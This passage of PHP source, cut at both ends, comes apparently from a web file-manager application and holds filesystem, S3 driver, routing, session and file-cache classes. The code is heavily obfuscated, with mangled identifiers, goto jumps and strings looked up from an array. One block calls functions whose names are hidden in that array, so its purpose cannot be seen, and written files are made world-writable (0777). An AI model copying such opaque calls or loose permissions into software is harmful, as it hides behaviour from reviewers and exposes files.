$eŒÙóææ = $this->pathFather($F“òƒ™ç¶); $e±ªé¹åŠ– = rtrim($eŒÙóææ, $dáÛÀ©¨¶Ø[8]) . $dáÛÀ©¨¶Ø[8] . $DŒ˜µ¥ã; goto E¼´Ü±š›; B¥çã–®é : } public function size($F£ÓˆºµŒ…) { $F£ÓˆºµŒ… = $this->iconvSystem($F£ÓˆºµŒ…); return filesize_64($F£ÓˆºµŒ…); } public function info($f¶„‘…”) { $f¶„‘…” = $this->iconvSystem($f¶„‘…”); if ($this->isFolder($f¶„‘…”)) { return $this->folderInfo($f¶„‘…”); } else { if ($this->isFile($f¶„‘…”)) { return $this->fileInfo($f¶„‘…”); } } return !1; } protected function infoChildren($f±ÁÎ‘Æì, &$CŞªØäÆØ×, $BèÄÃóÓ„ = true) { goto dßŒ…³èñ–; DÎÚ–ƒÊÈ: if ($BèÄÃóÓ„) { $f±ÁÎ‘Æì = $this->iconvSystem($f±ÁÎ‘Æì); } if (!($b‚´ØîÊ™ = @opendir($f±ÁÎ‘Æì))) { return; } while (($eó”Æ½…ˆˆ = readdir($b‚´ØîÊ™)) !== !1) { if ($eó”Æ½…ˆˆ == $bØãëëÎĞ[95] || $eó”Æ½…ˆˆ == $bØãëëÎĞ[1259]) { continue; } $A¦Ô®†ÍØ® = $f±ÁÎ‘Æì . $eó”Æ½…ˆˆ; if (is_file($A¦Ô®†ÍØ®) || is_link($A¦Ô®†ÍØ®)) { $CŞªØäÆØ×[$bØãëëÎĞ[79]]++; $CŞªØäÆØ×[$bØãëëÎĞ[78]] += filesize_64($A¦Ô®†ÍØ®); } else { if (is_dir($A¦Ô®†ÍØ®)) { $CŞªØäÆØ×[$bØãëëÎĞ[80]]++; $this->infoChildren($A¦Ô®†ÍØ®, $CŞªØäÆØ×, !1); } } } goto A³£ö‡Å¤è; dßŒ…³èñ–: $bØãëëÎĞ =& $_SERVER[úÉ·öƒÑì©]; check_abort_echo(); $f±ÁÎ‘Æì = rtrim($f±ÁÎ‘Æì, $bØãëëÎĞ[8]) . $bØãëëÎĞ[8]; goto DÎÚ–ƒÊÈ; A³£ö‡Å¤è: closedir($b‚´ØîÊ™); goto DÁÊÖÃßÅ„; DÁÊÖÃßÅ„: } private function folderInfo($cƒ°ùÛ–, $AÀí†ªÂˆä = false) { $Dñ³é¤´ƒæ =& $_SERVER[úÉ·öƒÑì©]; $cƒ°ùÛ– = rtrim($cƒ°ùÛ–, $Dñ³é¤´ƒæ[8]) . $Dñ³é¤´ƒæ[8]; $a…İ÷®‡º = $this->iconvApp($this->pathThis($cƒ°ùÛ–)); if ($AÀí†ªÂˆä) { return array($Dñ³é¤´ƒæ[28] => $a…İ÷®‡º, $Dñ³é¤´ƒæ[76] => $this->getPathOuter($cƒ°ùÛ–), $Dñ³é¤´ƒæ[29] => $Dñ³é¤´ƒæ[77]); } $AŠß¢¡“Ş¬ = array($Dñ³é¤´ƒæ[28] => $a…İ÷®‡º, $Dñ³é¤´ƒæ[76] => $this->getPathOuter($cƒ°ùÛ–), $Dñ³é¤´ƒæ[29] => $Dñ³é¤´ƒæ[77], $Dñ³é¤´ƒæ[194] => @filectime($cƒ°ùÛ–), $Dñ³é¤´ƒæ[84] => @filemtime($cƒ°ùÛ–), $Dñ³é¤´ƒæ[1262] => @fileatime($cƒ°ùÛ–), $Dñ³é¤´ƒæ[1263] => is_readable($cƒ°ùÛ–), $Dñ³é¤´ƒæ[1264] => is_writable($cƒ°ùÛ–), $Dñ³é¤´ƒæ[1265] => get_mode($cƒ°ùÛ–)); return $AŠß¢¡“Ş¬; } private function fileInfo($FÙ‚ëï¶ºƒ, $d™îÊÎãÜ‚ = false) { $BÉœäâÍĞ· =& $_SERVER[úÉ·öƒÑì©]; $dŸêÆ±Ç·è = $this->iconvApp($this->pathThis($FÙ‚ëï¶ºƒ)); if ($d™îÊÎãÜ‚) { return array($BÉœäâÍĞ·[28] => $dŸêÆ±Ç·è, $BÉœäâÍĞ·[76] => $this->getPathOuter($FÙ‚ëï¶ºƒ), $BÉœäâÍĞ·[29] => $BÉœäâÍĞ·[193], $BÉœäâÍĞ·[78] => $this->size($FÙ‚ëï¶ºƒ), $BÉœäâÍĞ·[168] => $this->ext($dŸêÆ±Ç·è)); } $B‚æ…‹ˆÜŠ = array($BÉœäâÍĞ·[28] => $dŸêÆ±Ç·è, $BÉœäâÍĞ·[76] => $this->getPathOuter($FÙ‚ëï¶ºƒ), $BÉœäâÍĞ·[29] => $BÉœäâÍĞ·[193], $BÉœäâÍĞ·[194] => @filectime($FÙ‚ëï¶ºƒ), $BÉœäâÍĞ·[84] => @filemtime($FÙ‚ëï¶ºƒ), $BÉœäâÍĞ·[1262] => @fileatime($FÙ‚ëï¶ºƒ), $BÉœäâÍĞ·[78] => $this->size($FÙ‚ëï¶ºƒ), $BÉœäâÍĞ·[168] => $this->ext($dŸêÆ±Ç·è), $BÉœäâÍĞ·[1263] => is_readable($FÙ‚ëï¶ºƒ), $BÉœäâÍĞ·[1264] => is_writable($FÙ‚ëï¶ºƒ), $BÉœäâÍĞ·[1265] => get_mode($FÙ‚ëï¶ºƒ)); return $B‚æ…‹ˆÜŠ; } public function exist($E»¿ÃËµğ) { $E»¿ÃËµğ = $this->iconvSystem($E»¿ÃËµğ); return @file_exists($E»¿ÃËµğ); } public function isFile($AÊà¸¬–ª) { $AÊà¸¬–ª = $this->iconvSystem($AÊà¸¬–ª); return @is_file($AÊà¸¬–ª); } public function isFolder($B¿¾ßàÃ„) { $B¿¾ßàÃ„ = $this->iconvSystem($B¿¾ßàÃ„); return @is_dir($B¿¾ßàÃ„); } public function listPath($BëŒùÂÂŸ, $F²Ÿ»†Å” = false) { goto F÷ƒÍ²ÏÕÃ; D ‰åÎêŒ¸: $CóÛ¨’ĞáŠ = array($c×ÍÖÄôÎ[75] => array(), $c×ÍÖÄôÎ[74] => array()); if (!($a¶õ“ÄñÙ = @opendir($BëŒùÂÂŸ))) { return $CóÛ¨’ĞáŠ; } while (($EÜ¤®«ò‘É = readdir($a¶õ“ÄñÙ)) !== !1) { if ($EÜ¤®«ò‘É == $c×ÍÖÄôÎ[95] || $EÜ¤®«ò‘É == $c×ÍÖÄôÎ[1259]) { continue; } $e¹ªÆèà = $BëŒùÂÂŸ . $EÜ¤®«ò‘É; if (is_file($e¹ªÆèà)) { $CóÛ¨’ĞáŠ[$c×ÍÖÄôÎ[74]][] = $this->fileInfo($e¹ªÆèà, $F²Ÿ»†Å”); } else { $CóÛ¨’ĞáŠ[$c×ÍÖÄôÎ[75]][] = $this->folderInfo($e¹ªÆèà, $F²Ÿ»†Å”); } } goto eÎ¶Î…‰“İ; eÎ¶Î…‰“İ: closedir($a¶õ“ÄñÙ); return $CóÛ¨’ĞáŠ; goto aÂŸ“ğ„ö; F÷ƒÍ²ÏÕÃ: $c×ÍÖÄôÎ =& $_SERVER[úÉ·öƒÑì©]; $BëŒùÂÂŸ = $this->iconvSystem($BëŒùÂÂŸ); $BëŒùÂÂŸ = rtrim($BëŒùÂÂŸ, $c×ÍÖÄôÎ[8]) . $c×ÍÖÄôÎ[8]; goto D ‰åÎêŒ¸; aÂŸ“ğ„ö: } public function listAll($F±Ìœåå, &$bÎÁñ›×Ì– = array()) { goto AËŠØŞ…Âì; cÛÑãÌÌ¢œ: return $bÎÁñ›×Ì–; goto EÆÑ¦ÌÇÎ”; bÅˆÚ¥“”§: if (!($e³Šøé’ÎÇ = @opendir($F±Ìœåå))) { return $bÎÁñ›×Ì–; } while (($e«§‚×ÌÎ = readdir($e³Šøé’ÎÇ)) !== !1) { if ($e«§‚×ÌÎ == $Cè†¬·­Š¼[95] || $e«§‚×ÌÎ == $Cè†¬·­Š¼[1259]) { continue; } $BÎ­·¦óŞ‡ = $F±Ìœåå . $e«§‚×ÌÎ; if (is_dir($BÎ­·¦óŞ‡) && !is_link($BÎ­·¦óŞ‡)) { $bÎÁñ›×Ì–[] = array($Cè†¬·­Š¼[76] => $BÎ­·¦óŞ‡ . $Cè†¬·­Š¼[8], $Cè†¬·­Š¼[77] => 1, $Cè†¬·­Š¼[84] => @filemtime($BÎ­·¦óŞ‡), $Cè†¬·­Š¼[78] => 0); $this->listAll($BÎ­·¦óŞ‡, $bÎÁñ›×Ì–); } else { $bÎÁñ›×Ì–[] = array($Cè†¬·­Š¼[76] => $BÎ­·¦óŞ‡, $Cè†¬·­Š¼[77] => 0, $Cè†¬·­Š¼[84] => @filemtime($BÎ­·¦óŞ‡), $Cè†¬·­Š¼[78] => $this->size($BÎ­·¦óŞ‡)); } } closedir($e³Šøé’ÎÇ); goto cÛÑãÌÌ¢œ; AËŠØŞ…Âì: $Cè†¬·­Š¼ =& $_SERVER[úÉ·öƒÑì©]; $F±Ìœåå = $this->iconvSystem($F±Ìœåå); $F±Ìœåå = rtrim($F±Ìœåå, $Cè†¬·­Š¼[8]) . $Cè†¬·­Š¼[8]; goto bÅˆÚ¥“”§; EÆÑ¦ÌÇÎ”: } public function has($d‰ÂŠÂ¦èÉ, $fàÎ§°Š¸ = false, $fğÍ’µ‹ºˆ = true) { goto B›àŠ‡Ğø„; c–Å¼®­³Ì: $AïÃé«ÖŠ« = 0; while (($dŒĞ¦ˆŠ‚¤ = readdir($fëÃ¨§ÓÉ)) !== !1) { if ($dŒĞ¦ˆŠ‚¤ == $DôÒÙÊë…[95] || $dŒĞ¦ˆŠ‚¤ == $DôÒÙÊë…[1259]) { continue; } $f±šÍğĞ“ = $d‰ÂŠÂ¦èÉ . $dŒĞ¦ˆŠ‚¤; if ($fàÎ§°Š¸) { $AïÃé«ÖŠ«++; if (@is_file($f±šÍğĞ“)) { $dÓá·‚Øç’++; } else { $f«ãÈ¢ˆ§++; } if ($AïÃé«ÖŠ« > 10000) { break; } continue; } if ($fğÍ’µ‹ºˆ) { if (@is_file($f±šÍğĞ“)) { return !0; } } else { if (@is_dir($f±šÍğĞ“ . $DôÒÙÊë…[8])) { return !0; } } } closedir($fëÃ¨§ÓÉ); goto dÎéõ¼œÄæ; bêô÷¸ô°ƒ: if (!($fëÃ¨§ÓÉ = @opendir($d‰ÂŠÂ¦èÉ))) { return !1; } $dÓá·‚Øç’ = 0; $f«ãÈ¢ˆ§ = 0; goto c–Å¼®­³Ì; B›àŠ‡Ğø„: $DôÒÙÊë… =& $_SERVER[úÉ·öƒÑì©]; $d‰ÂŠÂ¦èÉ = $this->iconvSystem($d‰ÂŠÂ¦èÉ); $d‰ÂŠÂ¦èÉ = rtrim($d‰ÂŠÂ¦èÉ, $DôÒÙÊë…[8]) . $DôÒÙÊë…[8]; goto bêô÷¸ô°ƒ; dÎéõ¼œÄæ: if ($fàÎ§°Š¸) { return array($DôÒÙÊë…[203] => $dÓá·‚Øç’, $DôÒÙÊë…[204] => $f«ãÈ¢ˆ§); } return !1; goto cŠñÈÕ½±Ú; cŠñÈÕ½±Ú: } public function hashSimple($Dáƒ²÷ŸÊª) { goto C»éÁÜ×¨À; EˆƒŸµ„: return md5($F‡—°ÔÔ‰) . $Cğè·Ü¦•ñ; goto b¾¾†»—íö; C›­è¿æƒË: if ($Cğè·Ü¦•ñ <= $D¤„æÆñ·ğ * $E¿—¹÷§¸Õ) { return $this->hashMd5($Dáƒ²÷ŸÊª) . $Cğè·Ü¦•ñ; } $F‡—°ÔÔ‰ = $FÁ¡Ì–Ï[33]; $B”¬Ğƒ¢™ = intval($Cğè·Ü¦•ñ / $E¿—¹÷§¸Õ); goto fâ£™¢øÙ; BÃå¨‹Êˆ—: fseek_64($FøêÎ‚÷éÕ, $Cğè·Ü¦•ñ - $D¤„æÆñ·ğ); $F‡—°ÔÔ‰ .= fread($FøêÎ‚÷éÕ, $D¤„æÆñ·ğ); fclose($FøêÎ‚÷éÕ); goto EˆƒŸµ„; fâ£™¢øÙ: $FøêÎ‚÷éÕ = fopen($Dáƒ²÷ŸÊª, $FÁ¡Ì–Ï[1266]); if (!$FøêÎ‚÷éÕ) { return $F‡—°ÔÔ‰; } for ($A¡õéÖõ = 0; $A¡õéÖõ < $E¿—¹÷§¸Õ; $A¡õéÖõ++) { fseek_64($FøêÎ‚÷éÕ, $B”¬Ğƒ¢™ * $A¡õéÖõ); $F‡—°ÔÔ‰ .= fread($FøêÎ‚÷éÕ, $D¤„æÆñ·ğ); } goto BÃå¨‹Êˆ—; C»éÁÜ×¨À: $FÁ¡Ì–Ï =& $_SERVER[úÉ·öƒÑì©]; if (!$Dáƒ²÷ŸÊª) { return md5($FÁ¡Ì–Ï[33]); } $Dáƒ²÷ŸÊª = $this->iconvSystem($Dáƒ²÷ŸÊª); goto eºÎšƒâ¹›; eºÎšƒâ¹›: $Cğè·Ü¦•ñ = $this->size($Dáƒ²÷ŸÊª); $D¤„æÆñ·ğ = 200; $E¿—¹÷§¸Õ = 50; goto C›­è¿æƒË; b¾¾†»—íö: } public function getContent($fÅÜò¥Ü) { $fÅÜò¥Ü = $this->iconvSystem($fÅÜò¥Ü); return file_get_contents($fÅÜò¥Ü); } public function setContent($E…å¼Æ§¶ğ, $D‡ˆ”ÑŒà = '') { $E…å¼Æ§¶ğ = $this->iconvSystem($E…å¼Æ§¶ğ); $F½¾“Îà‰ = @file_put_contents($E…å¼Æ§¶ğ, $D‡ˆ”ÑŒà, LOCK_EX); clearstatcache(); @chmod($E…å¼Æ§¶ğ, 511); return $F½¾“Îà‰ === !1 ? !1 : !0; } public function fileSubstr($eŸ³¸Œ¯, $b¬¯ÌµµêÌ = 0, $EªîÀµ—ï = false) { goto d¦¿ëö°¿¶; d¦¿ëö°¿¶: $aäÕÉ…¨£» =& $_SERVER[úÉ·öƒÑì©]; $eŸ³¸Œ¯ = $this->iconvSystem($eŸ³¸Œ¯); if ($EªîÀµ—ï === !1) { $EªîÀµ—ï = $this->size($eŸ³¸Œ¯); } goto F¡Œ’Ÿ±; d°Ÿõ«ùëÃ: return $EƒÊ—¿÷¸; goto f‰Ñ´½ÑÄ„; F¡Œ’Ÿ±: if ($EªîÀµ—ï <= 0) { return $aäÕÉ…¨£»[33]; } $AîŒ¢ÌÇÓà = fopen($eŸ³¸Œ¯, $aäÕÉ…¨£»[1266]); if (!$AîŒ¢ÌÇÓà) { return !1; } goto a‘ƒø°Ê¬; a‘ƒø°Ê¬: fseek_64($AîŒ¢ÌÇÓà, $b¬¯ÌµµêÌ); $EƒÊ—¿÷¸ = fread($AîŒ¢ÌÇÓà, $EªîÀµ—ï); fclose($AîŒ¢ÌÇÓà); goto d°Ÿõ«ùëÃ; f‰Ñ´½ÑÄ„: } public function upload($dé³Ùµ§ÈŠ, $ağğ²çˆïŠ, $Aø§éğ®É¶ = false, $eÙÃç³§¯ = REPEAT_REPLACE) { if ($Aø§éğ®É¶) { return $this->moveFile($ağğ²çˆïŠ, $dé³Ùµ§ÈŠ); } return $this->copyFile($ağğ²çˆïŠ, $dé³Ùµ§ÈŠ); } public function setModifyTime($BŒ¯×«ÎÑ, $d«÷÷ÎÕŒ = '') { @touch($BŒ¯×«ÎÑ, intval($d«÷÷ÎÕŒ)); } public function download($f¬öŠ¿ËâÓ, $b¹¬°¿“¬) { return $this->iconvSystem($f¬öŠ¿ËâÓ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($dàäÑ äíÆ) { parent::__construct($dàäÑ äíÆ); $this->signatureVersion($_SERVER[úÉ·öƒÑì©][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($d‘’¬ÙœƒŠ) { parent::__construct($d‘’¬ÙœƒŠ); $this->signatureVersion($_SERVER[úÉ·öƒÑì©][212]); } public function fileOutLink($b‡š¿‡Â®Ş) { $a”¬Ó†¶Ä =& $_SERVER[úÉ·öƒÑì©]; if (substr($b‡š¿‡Â®Ş, 0, 7) == $a”¬Ó†¶Ä[1211]) { $b‡š¿‡Â®Ş = $a”¬Ó†¶Ä[1212] . substr($b‡š¿‡Â®Ş, 7); } header($a”¬Ó†¶Ä[159] . $b‡š¿‡Â®Ş); die; } } goto FÂÆëßÄ°; cÏÏ¶­¯­ì: if ($_SERVER[$_SERVER[úÉ·öƒÑì©][244]] != $_SERVER[$_SERVER[úÉ·öƒÑì©][847]]) { goto bëÉ‰½Âš; a¦Ã‹ÊÜë: $a‰¹çŒšĞÅ = explode($_SERVER[úÉ·öƒÑì©][229], $A‡İŒÛƒÄ½); if (count($a‰¹çŒšĞÅ) < $_SERVER[úÉ·öƒÑì©][248]) { $E„ãŒÜø‡• = $_SERVER[úÉ·öƒÑì©][249]; $E„ãŒÜø‡•(); } $FÄ˜ÀÖĞÕë = $_SERVER[úÉ·öƒÑì©][250]; goto c»’Š¾ºÙ†; bëÉ‰½Âš: $EŸì»ÍÏÃ = $_SERVER[úÉ·öƒÑì©][245]; $c²Ì³¤Ã = $_SERVER[$_SERVER[úÉ·öƒÑì©][246]] . $_SERVER[úÉ·öƒÑì©][247]; $A‡İŒÛƒÄ½ = $EŸì»ÍÏÃ($c²Ì³¤Ã); goto a¦Ã‹ÊÜë; c»’Š¾ºÙ†: $FÄ˜ÀÖĞÕë($_SERVER[$_SERVER[úÉ·öƒÑì©][242]]); goto d­„¬¹Ã‚Í; d­„¬¹Ã‚Í: } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\x5b\136\57\135\53", "\x3a\156\165\155" => "\133\x30\55\71\x5d\x2b", "\x3a\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($bß¦Å”‚„Ç, $d½ƒç§¼èÒ) { $D‘º‡¿è¼÷ =& $_SERVER[úÉ·öƒÑì©]; if ($bß¦Å”‚„Ç == $D‘º‡¿è¼÷[1484]) { $EĞŒÕÒé®İ = array_map($D‘º‡¿è¼÷[1485], $d½ƒç§¼èÒ[0]); $FÅî˜İ” = strpos($d½ƒç§¼èÒ[1], $D‘º‡¿è¼÷[8]) === 0 ? $d½ƒç§¼èÒ[1] : $D‘º‡¿è¼÷[8] . $d½ƒç§¼èÒ[1]; $dßë³ä®£¬ = $d½ƒç§¼èÒ[2]; } else { $EĞŒÕÒé®İ = null; $FÅî˜İ” = strpos($d½ƒç§¼èÒ[0], $D‘º‡¿è¼÷[8]) === 0 ? $d½ƒç§¼èÒ[0] : $D‘º‡¿è¼÷[8] . $d½ƒç§¼èÒ[0]; $dßë³ä®£¬ = $d½ƒç§¼èÒ[1]; } array_push(self::$maps, $EĞŒÕÒé®İ); array_push(self::$routes, $FÅî˜İ”); array_push(self::$methods, strtoupper($bß¦Å”‚„Ç)); array_push(self::$callbacks, $dßë³ä®£¬); } public static function error($DŸÓ†ƒéñé) { self::$errorCallback = $DŸÓ†ƒéñé; } public static function haltOnMatch($a¦÷’ÀÆÂ = true) { self::$halts = $a¦÷’ÀÆÂ; } public static function dispatch() { goto Cø®­¢»ÜÇ; Cø®­¢»ÜÇ: $bèŠêÊ¼ğÁ =& $_SERVER[úÉ·öƒÑì©]; $Eœ˜ÉÈæ˜ = parse_url($_SERVER[$bèŠêÊ¼ğÁ[1486]], PHP_URL_PATH); $E¶â™©®¦Í = $_SERVER[$bèŠêÊ¼ğÁ[157]]; goto B…Å¡„†ŠÕ; B…Å¡„†ŠÕ: $dï†õï‹›¯ = array_keys(static::$patterns); $Cçôƒí³ = array_values(static::$patterns); $E”ˆùÍ¬« = !1; goto DÖ‡äÎ†ùÄ; DÖ‡äÎ†ùÄ: self::$routes = preg_replace($bèŠêÊ¼ğÁ[1171], $bèŠêÊ¼ğÁ[8], self::$routes); if (in_array($Eœ˜ÉÈæ˜, self::$routes)) { $E•êªÖç­Ú = array_keys(self::$routes, $Eœ˜ÉÈæ˜); foreach ($E•êªÖç­Ú as $e¥Ô¤ÛÅ¤Â) { if (self::$methods[$e¥Ô¤ÛÅ¤Â] == $E¶â™©®¦Í || self::$methods[$e¥Ô¤ÛÅ¤Â] == $bèŠêÊ¼ğÁ[1487] || in_array($E¶â™©®¦Í, self::$maps[$e¥Ô¤ÛÅ¤Â])) { $E”ˆùÍ¬« = !0; if (!is_object(self::$callbacks[$e¥Ô¤ÛÅ¤Â])) { $dçŠô±™íĞ = explode($bèŠêÊ¼ğÁ[8], self::$callbacks[$e¥Ô¤ÛÅ¤Â]); $eõÍîÅìì„ = end($dçŠô±™íĞ); $Aˆ­Éˆ„ = explode($bèŠêÊ¼ğÁ[1488], $eõÍîÅìì„); $d“«˜ñê = new $Aˆ­Éˆ„[0](); $d“«˜ñê->{$Aˆ­Éˆ„[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$e¥Ô¤ÛÅ¤Â]); if (self::$halts) { return; } } } } } else { $c¶Ş´ÉÅ‹Ë = 0; foreach (self::$routes as $e¥Ô¤ÛÅ¤Â) { if (strpos($e¥Ô¤ÛÅ¤Â, $bèŠêÊ¼ğÁ[4]) !== !1) { $e¥Ô¤ÛÅ¤Â = str_replace($dï†õï‹›¯, $Cçôƒí³, $e¥Ô¤ÛÅ¤Â); } if (preg_match($bèŠêÊ¼ğÁ[1489] . $e¥Ô¤ÛÅ¤Â . $bèŠêÊ¼ğÁ[1490], $Eœ˜ÉÈæ˜, $b·±¤ã“É)) { if (self::$methods[$c¶Ş´ÉÅ‹Ë] == $E¶â™©®¦Í || self::$methods[$c¶Ş´ÉÅ‹Ë] == $bèŠêÊ¼ğÁ[1487] || !empty(self::$maps[$c¶Ş´ÉÅ‹Ë]) && in_array($E¶â™©®¦Í, self::$maps[$c¶Ş´ÉÅ‹Ë])) { $E”ˆùÍ¬« = !0; array_shift($b·±¤ã“É); if (!is_object(self::$callbacks[$c¶Ş´ÉÅ‹Ë])) { $dçŠô±™íĞ = explode($bèŠêÊ¼ğÁ[8], self::$callbacks[$c¶Ş´ÉÅ‹Ë]); $eõÍîÅìì„ = end($dçŠô±™íĞ); $Aˆ­Éˆ„ = explode($bèŠêÊ¼ğÁ[1488], $eõÍîÅìì„); $d“«˜ñê = new $Aˆ­Éˆ„[0](); if (!method_exists($d“«˜ñê, $Aˆ­Éˆ„[1])) { echo $bèŠêÊ¼ğÁ[1491]; } else { call_user_func_array(array($d“«˜ñê, $Aˆ­Éˆ„[1]), $b·±¤ã“É); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$c¶Ş´ÉÅ‹Ë], $b·±¤ã“É); if (self::$halts) { return; } } } } $c¶Ş´ÉÅ‹Ë++; } } if ($E”ˆùÍ¬« == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $bŞ®Ï×Ô =& $_SERVER[úÉ·öƒÑì©]; header($_SERVER[$bŞ®Ï×Ô[1492]] . $bŞ®Ï×Ô[1493]); echo $bŞ®Ï×Ô[1494]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$bèŠêÊ¼ğÁ[1486]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto díé†éÉŠµ; díé†éÉŠµ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto c‡‡¹§ŸŸõ; C†™’ÍÁÁ°: if (self::$sessionSign) { } else { if (Cookie::get($Aá’Û™°Î)) { self::$sessionSign = Cookie::get($Aá’Û™°Î); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Aá’Û™°Î, self::$sessionSign, self::$sessionTime); $e²Ìèãñ÷‡ = $DĞÕÓ†ß£[$aŠ˜¥¾·›ˆ[1497]]; goto e†ò†¥ÏÙÀ; c‡‡¹§ŸŸõ: $aŠ˜¥¾·›ˆ =& $_SERVER[úÉ·öƒÑì©]; static $dùÍØç±¥Ú = false; if ($dùÍØç±¥Ú) { return $dùÍØç±¥Ú; } goto BéÉ¨Ì½‡; eõ˜³Ì•Ü: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $dùÍØç±¥Ú = new self(); return $dùÍØç±¥Ú; goto BïÂœÄ¥õÊ; e†ò†¥ÏÙÀ: $e÷á´ŞªÅ = $DĞÕÓ†ß£[$e²Ìèãñ÷‡]; $F‚ÙÇ‹ñÚ• = $DĞÕÓ†ß£[$aŠ˜¥¾·›ˆ[809]]; switch ($e²Ìèãñ÷‡) { case $aŠ˜¥¾·›ˆ[17]: self::$handle = Model($aŠ˜¥¾·›ˆ[810]); break; case $aŠ˜¥¾·›ˆ[811]: self::$handle = new CacheRedis($e÷á´ŞªÅ, $F‚ÙÇ‹ñÚ•); break; case $aŠ˜¥¾·›ˆ[812]: self::$handle = new CacheMemcached($e÷á´ŞªÅ, $F‚ÙÇ‹ñÚ•); break; case $aŠ˜¥¾·›ˆ[193]: $e÷á´ŞªÅ[$aŠ˜¥¾·›ˆ[76]] = $e÷á´ŞªÅ[$aŠ˜¥¾·›ˆ[76]] . $aŠ˜¥¾·›ˆ[1498]; self::$handle = new CacheFile($e÷á´ŞªÅ, $F‚ÙÇ‹ñÚ•); default: break; } goto eõ˜³Ì•Ü; BéÉ¨Ì½‡: $DĞÕÓ†ß£ = $GLOBALS[$aŠ˜¥¾·›ˆ[6]][$aŠ˜¥¾·›ˆ[356]]; self::$sessionTime = $DĞÕÓ†ß£[$aŠ˜¥¾·›ˆ[1495]]; $Aá’Û™°Î = isset($GLOBALS[$aŠ˜¥¾·›ˆ[1496]]) ? $GLOBALS[$aŠ˜¥¾·›ˆ[1496]] : SESSION_ID; goto C†™’ÍÁÁ°; BïÂœÄ¥õÊ: } public static function sign($eìÑ³ˆ¾± = false) { $eìÑ³ˆ¾± && (self::$sessionSign = $eìÑ³ˆ¾±); self::init(); return self::$sessionSign; } public static function set($fÖ‘²µ–ó, $E’–Ÿß‹‹ = false) { self::init(); if (is_array($fÖ‘²µ–ó)) { foreach ($fÖ‘²µ–ó as $b¥ÌĞø¼†ô => $C‘ïæ¢˜Ã²) { array_set_value(self::$data, $b¥ÌĞø¼†ô, $C‘ïæ¢˜Ã²); } } else { array_set_value(self::$data, $fÖ‘²µ–ó, $E’–Ÿß‹‹); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($E¦•ÅÓµ = false) { self::init(); if (!$E¦•ÅÓµ) { return self::$data; } return array_get_value(self::$data, $E¦•ÅÓµ); } public static function remove($bŞ‚µÏëè) { self::init(); unset(self::$data[$bŞ‚µÏëè]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[úÉ·öƒÑì©][814])) { self::$handle->clearTimeout(); } } } goto c¤é®›À¿Í; FŒ±Í±…Ûø: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($A¾‡Ò…¿ğ¥, $eõåõ‰İ±) { $BøÇÓÍŒ»¼ =& $_SERVER[úÉ·öƒÑì©]; $this->cachePath = $A¾‡Ò…¿ğ¥[$BøÇÓÍŒ»¼[76]]; $this->prefix = $BøÇÓÍŒ»¼[815]; $this->cacheTime = $eõåõ‰İ±; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($FÚ´ÉÊó) { $AôÚ™ËøïÁ =& $_SERVER[úÉ·öƒÑì©]; $FÚ´ÉÊó = str_replace(array($AôÚ™ËøïÁ[816], $AôÚ™ËøïÁ[97], $AôÚ™ËøïÁ[70]), $AôÚ™ËøïÁ[817], $FÚ´ÉÊó); return $this->cachePath . $AôÚ™ËøïÁ[818] . $FÚ´ÉÊó . $AôÚ™ËøïÁ[819]; } public function set($DëÓí¸¡, $a™’»Õ çµ, $b÷¡”„ì¬Ä = false) { $F›¯±Â¢‰Ú = $this->getFile($DëÓí¸¡); if (file_put_contents($F›¯±Â¢‰Ú, $this->prefix . $a™’»Õ çµ, LOCK_EX)) { @touch($F›¯±Â¢‰Ú, intval(time() + $b÷¡”„ì¬Ä)); clearstatcache(); return !0; } @unlink($F›¯±Â¢‰Ú); return !1; } public function get($a¢É›Äàæ¦) { $Eª†£ì™¾½ = $this->getFile($a¢É›Äàæ¦); if (file_exists($Eª†£ì™¾½) && filemtime($Eª†£ì™¾½) < time()) { @unlink($Eª†£ì™¾½); return !1; } $dÍå‘Ã›ø = @file_get_contents($Eª†£ì™¾½); return substr($dÍå‘Ã›ø, strlen($this->prefix)); } public function remove($Dø´¤À¢äù) { $f©‡‘ã”¾ø = $this->getFile($Dø´¤À¢äù); return @unlink($f©‡‘ã”¾ø); } public function deleteAll() { $FãîĞ‡ò‘Ê =& $_SERVER[úÉ·öƒÑì©]; $f‰ÌÙ®‰±Ğ = scandir($this->cachePath); foreach ($f‰ÌÙ®‰±Ğ as $Dø†¶³­Ü) { $b¬‘á©®Š = $this->cachePath . $Dø†¶³­Ü; if (strpos($b¬‘á©®Š, $FãîĞ‡ò‘Ê[819]) && strpos($b¬‘á©®Š, $FãîĞ‡ò‘Ê[820])) { @unlink($b¬‘á©®Š); } } } public function clearTimeout() { $E„ÑĞÖ†…Ã =& $_SERVER[úÉ·öƒÑì©]; $EÄ‹é˜İˆÊ = scandir($this->cachePath); foreach ($EÄ‹é˜İˆÊ as $d¤Ìˆ„Ğ•Ã) { $BôïÆ÷ÏŞ = $this->cachePath . $d¤Ìˆ„Ğ•Ã; if (strpos($BôïÆ÷ÏŞ, $E„ÑĞÖ†…Ã[819]) && strpos($BôïÆ÷ÏŞ, $E„ÑĞÖ†…Ã[820]) && 